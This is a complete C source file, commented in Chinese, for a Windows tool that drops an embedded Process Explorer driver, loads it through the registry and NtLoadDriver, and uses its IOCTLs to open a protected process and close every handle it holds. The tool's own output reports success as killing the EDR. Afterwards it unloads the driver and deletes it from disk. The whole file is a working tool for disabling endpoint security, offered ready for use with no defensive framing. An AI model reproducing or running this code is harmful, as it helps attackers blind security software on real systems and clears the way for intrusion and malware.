#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include "resource.h"

#define STATUS_IMAGE_ALREADY_LOADED 0xC000010E
#define STATUS_OBJECT_NAME_COLLISION 0xC0000035
#define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)
#define IOCTL_CLOSE_HANDLE 2201288708
#define IOCTL_OPEN_PROTECTED_PROCESS_HANDLE 2201288764
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define CONST_SYSTEM_HANDLE_INFORMATION 16


typedef struct _ioControl
{
	ULONGLONG ulPID;
	PVOID lpObjectAddress;
	ULONGLONG ulSize;
	ULONGLONG ulHandle;
} PROCEXP_DATA_EXCHANGE, * PPROCEXP_DATA_EXCHANGE;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;			//Pointer to the object, the object resides in kernel space
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG HandleCount;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[ANYSIZE_ARRAY];
}  SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;


// 判断是否使用管理员权限启动
BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

// 提升权限为 debug
BOOL EnablePriv()
{
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tkp;

		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);//修改进程权限
		tkp.PrivilegeCount = 1;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL);//通知系统修改进程权限

		return((GetLastError() == ERROR_SUCCESS));
	}
	return FALSE;
}

//提升权限具备 SeLoadDriverPrivilege 权限
BOOL EnablePrivilege(LPCWSTR lpPrivilegeName)
{
	TOKEN_PRIVILEGES tpPrivilege;
	HANDLE hToken;

	tpPrivilege.PrivilegeCount = 1;
	tpPrivilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!LookupPrivilegeValueW(NULL, lpPrivilegeName,
		&tpPrivilege.Privileges[0].Luid))
		return FALSE;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tpPrivilege, sizeof(tpPrivilege), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

//验证 Pid 是否存在
BOOL verifyPID(DWORD dwPID) {
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPID);
	if (hProcess == NULL)
	{
		return FALSE;
	}
	return TRUE;
}



//将资源文件中的 ProcEXP.sys 写入到当前目录，命名为 ProcEXP
BOOL WriteResourceToDisk(LPWSTR path) {
	HGLOBAL     hgResHandle = NULL;
	HRSRC       hrRes = NULL;
	LPVOID		lpLock = NULL;
	DWORD       dwResourceSize = 0, dwBytesWritten = 0;
	HANDLE		hFile = NULL;
	BOOL		bRet;

	hrRes = FindResource(NULL, MAKEINTRESOURCE(IDR_SYS2), RT_RCDATA);	// 定位资源
	if (!hrRes)
	{
		DWORD error = GetLastError();
		printf("[!] Failed to find resource: %d", error);
		return FALSE;
	}

	hgResHandle = LoadResource(NULL, hrRes);
	if (!hgResHandle)
	{
		printf("[!] Failed to load resource\n");
		return FALSE;
	}

	lpLock = (LPVOID)LockResource(hgResHandle);
	if (!lpLock)
	{
		printf("[!] Failed to lock resource\n");
		return FALSE;
	}

	dwResourceSize = SizeofResource(NULL, hrRes);
	if (dwResourceSize == 0)
	{
		printf("[!] Failed to get resource's size\n");
		return FALSE;
	}

	hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);	//在当前目录下创建文件 ProcEXP
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[!] Failed to create procexp\n");
		return FALSE;
	}

	bRet = WriteFile(hFile, lpLock, dwResourceSize, &dwBytesWritten, NULL);	//将资源文件写入到 ProcEXP
	if (!bRet)
	{
		printf("[!] Failed to write driver\n");
		return FALSE;
	}

	CloseHandle(hFile);
	FreeResource(hgResHandle);

	return TRUE;
}


//删除当前目录下的 ProcEXP
BOOL DeleteResourceFromDisk(LPWSTR szPath) {
	BOOL		bRet;
	bRet = DeleteFileW(szPath);
	if (!bRet)
		return FALSE;
	else
		printf("[+] Driver File cleaned up from disk\n");

	return TRUE;

}

//注册注册表
BOOL SetRegistryValues(LPWSTR szPath) {

	HKEY hKey = NULL;
	WCHAR regPath[MAX_PATH] = L"System\\CurrentControlSet\\Services\\ProcEXP";
	WCHAR driverPath[MAX_PATH] = { 0 };
	LSTATUS status = -1;
	DWORD dwData = 0, dwDisposition = 0;

	_snwprintf_s(driverPath, MAX_PATH, _TRUNCATE, L"%ws%ws", L"\\??\\", szPath);


	status = RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	if (status) {
		printf("[!] Failed to Create Key: %d\n", status);
		return FALSE;
	}


	status = RegSetValueEx(hKey, L"Type", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD));
	if (status) {
		printf("[!] Failed to Set Type: %d\n", status);
		return FALSE;
	}

	status = RegSetValueEx(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD));
	if (status) {
		printf("[!] Failed to Set ErrorControl: %d\n", status);
		return FALSE;
	}

	status = RegSetValueEx(hKey, L"Start", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD));
	if (status) {
		printf("[!] Failed to Set Start: %d\n", status);
		return FALSE;
	}

	status = RegSetValueEx(hKey, L"ImagePath", 0, REG_SZ, (const BYTE*)driverPath, (DWORD)(sizeof(wchar_t) * (wcslen(driverPath) + 1)));
	if (status) {
		printf("[!] Failed to Set ImagePath: %d\n", status);
		return FALSE;
	}

	return TRUE;
}

// 删除注册表
BOOL DeleteRegistryKey() {
	WCHAR szRegistryPath[MAX_PATH] = L"System\\CurrentControlSet\\Services\\ProcEXP";
	LSTATUS status;

	status = RegDeleteKeyExW(HKEY_LOCAL_MACHINE, szRegistryPath, KEY_WOW64_64KEY, 0);

	if (status) {
		printf("[!] Failed to Delete Key: %d\n", status);
		return FALSE;
	}
	return TRUE;
}

// 加载驱动
BOOL LoadDriver(LPWSTR szPath) {
	typedef NTSTATUS(_stdcall* NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
	typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);

	NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver");	//从 ntdll.dll 中得到内核函数 NtloadDriver
	RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");	//从 ntdll.dll 中得到内核函数 RtlInitUnicodeString

	UNICODE_STRING usDriverServiceName = { 0 };
	WCHAR szNtRegistryPath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\ProcEXP";
	NTSTATUS ret;

	if (!EnablePrivilege(L"SeLoadDriverPrivilege")) {
		return FALSE;
	}

	if (!SetRegistryValues(szPath))
	{
		return FALSE;
	}


	RtlInitUnicodeString(&usDriverServiceName, szNtRegistryPath);


	ret = NtLoadDriver(&usDriverServiceName);


	if (ret != STATUS_SUCCESS && ret != STATUS_IMAGE_ALREADY_LOADED && ret != STATUS_OBJECT_NAME_COLLISION) {
		printf("[!] NtLoadDriver: %x\n", ret);
		return FALSE;
	}
	return TRUE;
}

// 连接驱动
HANDLE ConnectProcExp()
{
	HANDLE hProcExp = CreateFileA("\\\\.\\PROCEXP152", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hProcExp == INVALID_HANDLE_VALUE)
		return NULL;

	return hProcExp;
}

// 卸载驱动
BOOL UnloadDriver(LPWSTR szPath) {

	typedef NTSTATUS(_stdcall* NT_UNLOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
	typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);

	NT_UNLOAD_DRIVER NtUnloadDriver = (NT_UNLOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnloadDriver");	//从 ntdll.dll 中得到内核函数 NtUnLoadDriver
	RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");	//从 ntdll.dll 中得到内核函数 RtlInitUnicodeString

	UNICODE_STRING usDriverServiceName = { 0 };
	WCHAR szRegistryPath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\ProcEXP";
	NTSTATUS ret;

	RtlInitUnicodeString(&usDriverServiceName, szRegistryPath);


	ret = NtUnloadDriver(&usDriverServiceName);

	if (ret != STATUS_SUCCESS) {
		DWORD error = GetLastError();
		printf("error: %d", error);
		DeleteRegistryKey();
		return FALSE;
	}

	DeleteRegistryKey();
	printf("[+] Driver unloaded successfully\n");
	return TRUE;
}

// 获取保护进程句柄
HANDLE ProcExpOpenProtectedProcess(ULONGLONG ulPID, HANDLE hProcExp)
{
	HANDLE hProtectedProcess = NULL;
	DWORD dwBytesReturned = 0;
	BOOL ret = FALSE;


	ret = DeviceIoControl(hProcExp, IOCTL_OPEN_PROTECTED_PROCESS_HANDLE, (LPVOID)&ulPID, sizeof(ulPID),
		&hProtectedProcess,
		sizeof(HANDLE),
		&dwBytesReturned,
		NULL);


	if (dwBytesReturned == 0 || !ret)
	{
		printf("[!] ProcExpOpenProtectedProcess.DeviceIoControl: %d\n", GetLastError());
		return NULL;
	}

	return hProtectedProcess;
}

// 通过 NtQuerySystemInformation 获取系统信息表
PSYSTEM_HANDLE_INFORMATION ReAllocateHandleInfoTableSize(ULONG ulTable_size, PSYSTEM_HANDLE_INFORMATION handleInformationTable) {

	HANDLE hHeap = GetProcessHeap();
	BOOL ret = HeapFree(hHeap, HEAP_NO_SERIALIZE, handleInformationTable); //first call handleInformationTable will be NULL, which is OK according to the documentation

	handleInformationTable =
		(PSYSTEM_HANDLE_INFORMATION)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulTable_size);
	return handleInformationTable;
}

// 获取句柄信息表
PSYSTEM_HANDLE_INFORMATION GetHandleInformationTable() {

	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInformationTable = NULL;

	ULONG ulSystemInfoLength = sizeof(SYSTEM_HANDLE_INFORMATION) + (sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) * 100) - 2300;

	//getting the address of NtQuerySystemInformation procedure, using the predefined type fNtQuerySystemInformation

	typedef NTSTATUS(WINAPI* fNtQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength);

	fNtQuerySystemInformation _NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

	handleInformationTable = ReAllocateHandleInfoTableSize(ulSystemInfoLength, handleInformationTable);
	while ((status = _NtQuerySystemInformation(
		CONST_SYSTEM_HANDLE_INFORMATION,
		handleInformationTable,
		ulSystemInfoLength,
		NULL
	)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		handleInformationTable = ReAllocateHandleInfoTableSize(ulSystemInfoLength *= 2, handleInformationTable);
	}


	if (!NT_SUCCESS(status))
		printf("[!] ReAllocateHandleInfoTableSize: %d", GetLastError());


	return handleInformationTable;
}


//根据句柄获取对象地址
PVOID GetObjectAddressFromHandle(DWORD dwPID, USHORT usTargetHandle)
{
	ULONG ulReturnLenght = 0;

	PSYSTEM_HANDLE_INFORMATION handleTableInformation = GetHandleInformationTable();

	for (ULONG i = 0; i < handleTableInformation->HandleCount; i++)
	{
		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = handleTableInformation->Handles[i];

		if (handleInfo.ProcessId == dwPID) //meaning that the handle is within our process of interest
		{
			if (handleInfo.Handle == usTargetHandle)
			{
				return handleInfo.Object;
			}
		}
	}
	return NULL;
}

// ProcEXP驱动发送 Kill 指令
BOOL ProcExpKillHandle(DWORD dwPID, ULONGLONG usHandle, HANDLE hProcExpDevice) {

	PVOID lpObjectAddressToClose = NULL;
	PROCEXP_DATA_EXCHANGE ctrl = { 0 };
	BOOL bRet = FALSE;

	/* find the object address */
	lpObjectAddressToClose = GetObjectAddressFromHandle(dwPID, (USHORT)usHandle);


	/* populate the data structure */
	ctrl.ulPID = dwPID;
	ctrl.ulSize = 0;
	ctrl.ulHandle = usHandle;
	ctrl.lpObjectAddress = lpObjectAddressToClose;

	/* send the kill command */
	bRet = DeviceIoControl(hProcExpDevice, IOCTL_CLOSE_HANDLE, (LPVOID)&ctrl, sizeof(PROCEXP_DATA_EXCHANGE), NULL,
		0,
		NULL,
		NULL);

	if (!bRet)
	{
		return FALSE;
	}
	return TRUE;
}

//核心
VOID KillProcessHandles(HANDLE hProcess, HANDLE hProcExp) {

	DWORD ProtectPID = GetProcessId(hProcess);


	ULONG ulReturnLenght = 0;

	//allocating memory for the SYSTEM_HANDLE_INFORMATION structure in the heap

	PSYSTEM_HANDLE_INFORMATION handleTableInformation = GetHandleInformationTable();


	for (ULONG i = 0; i < handleTableInformation->HandleCount; i++)
	{
		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = handleTableInformation->Handles[i];


		if (handleInfo.ProcessId == ProtectPID) //meaning that the handle is within our process of interest
		{

			/* Check if the process is already killed every 15 closed handles (otherwise we'll keep trying to close handles that are already closed) */
			if (i % 15 == 0)
			{
				DWORD dwProcStatus = 0;
				GetExitCodeProcess(hProcess, &dwProcStatus);
				if (dwProcStatus != STILL_ACTIVE)
				{
					printf("[+] Kill EDR Successfully\n");
					return;
				}
			}
			ProcExpKillHandle(ProtectPID, handleInfo.Handle, hProcExp);
		}
	}
}



int main(int argc, char* argv[])
{
	DWORD dwPid = 0;
	WCHAR szDriverPath[MAX_PATH] = { 0 };
	WCHAR cwd[MAX_PATH + 1];
	HANDLE hConnect, hProtectedProcess;

	if (argc != 2)
	{
		printf("Usage: %s pid", argv[0]);
		return 0;
	}

	dwPid = atoi(argv[1]);

	printf("[+] Checking...\n");

	if (!IsElevated())
	{
		printf("[!] Please start with administrator");
		return 0;
	}
	if (!EnablePriv())
	{
		printf("[!] Failed to set Debug Privilege");
		return 0;
	}
	if (!verifyPID(dwPid))
	{
		printf("[!] Pid Error");
		return 0;
	}

	GetCurrentDirectoryW(MAX_PATH + 1, cwd);
	_snwprintf_s(szDriverPath, MAX_PATH, _TRUNCATE, L"%ws\\%ws", cwd, L"PROCEXP"); // 将当前地址与“PROCEXP”格式化拼接到 szDriverPath
	WriteResourceToDisk(szDriverPath);

	if (LoadDriver(szDriverPath))
	{
		printf("[+] Driver loaded successfully\n");
	}

	hConnect = ConnectProcExp();
	if (hConnect == NULL)
	{
		printf("[!] Failed to Connect ProcEXP\n");
		return 0;
	}
	else
	{
		printf("[+] Connected to Driver successfully\n");
	}

	hProtectedProcess = ProcExpOpenProtectedProcess(dwPid, hConnect);
	if (hProtectedProcess == INVALID_HANDLE_VALUE)
	{
		printf("[!]could not get handle to protected process\n");
		return 0;
	}
	else
		printf("[+] Get handle to protected process sucessfully\n");

	KillProcessHandles(hProtectedProcess, hConnect);

	if (CloseHandle(hConnect))
	{
		UnloadDriver(szDriverPath);
		DeleteResourceFromDisk(szDriverPath);
	}
}